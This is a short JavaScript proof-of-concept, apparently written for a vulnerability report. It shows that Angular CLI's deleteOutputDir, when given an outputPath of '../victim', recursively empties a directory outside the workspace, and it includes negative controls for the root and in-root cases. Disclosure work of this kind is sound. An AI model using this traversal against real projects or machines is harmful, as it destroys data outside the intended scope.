// Real-path PoC: deleteOutputDir as invoked by the LEGACY webpack browser/server builders
// (packages/angular_devkit/build_angular/src/builders/{browser,server}/index.ts call
//  deleteOutputDir(context.workspaceRoot, options.outputPath) with NO traversal validation;
//  deleteOutputDir resolves outputPath against the workspace root and recursively removes
//  the RESOLVED directory's contents — only rejecting equality with the root itself.)
import { deleteOutputDir } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/dist/bin/packages/angular/build/src/utils/delete-output-dir.js';
import { readdirSync } from 'node:fs';

const workspaceRoot = '/tmp/del-poc/ws';
const maliciousOutputPath = '../victim'; // as set in angular.json / --output-path

console.log('victim BEFORE:', readdirSync('/tmp/del-poc/victim').join(','));
await deleteOutputDir(workspaceRoot, maliciousOutputPath);
console.log('victim AFTER :', readdirSync('/tmp/del-poc/victim').length === 0 ? 'EMPTY (deleted)' : readdirSync('/tmp/del-poc/victim').join(','));

// Negative control 1: workspace root itself is refused
try {
  await deleteOutputDir(workspaceRoot, workspaceRoot);
  console.log('NEG1: root delete NOT refused (unexpected)');
} catch (e) {
  console.log('NEG1: root delete refused:', e.message);
}
// Negative control 2: in-root output deletes only that dir (correct behavior)
await deleteOutputDir('/tmp/del-poc/ws', './dist');
console.log('NEG2: in-root delete ok');
